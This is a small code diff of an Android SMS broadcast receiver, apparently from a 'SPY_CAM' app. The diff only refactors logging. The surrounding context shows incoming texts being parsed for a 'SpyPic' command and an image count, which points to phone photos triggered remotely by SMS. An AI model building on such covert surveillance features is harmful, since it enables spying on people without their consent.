@@ -11,6 +11,7 @@ public class SmsReceiver extends BroadcastReceiver {
     private String msg_from;
     private String msgBody;
     private int firstValue;
+    private String LOG_TAG = "SPY_CAM";
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -26,7 +27,7 @@ public class SmsReceiver extends BroadcastReceiver {
                         msg_from = msgs[i].getOriginatingAddress();
                         msgBody = msgs[i].getMessageBody();
                         String intValue = msgBody.replaceAll("[^0-9]", "");
-                        Log.i("SPY_CAM", "INT :" + intValue);
+                        Log.i(LOG_TAG , String.format("requested images %s" , intValue));
                         String originalMsg = msgBody.replaceAll("[0-9]","");
                         Log.i("SPY_CAM" , "Msg :" + originalMsg);
                         if (originalMsg.equals("SpyPic")) {
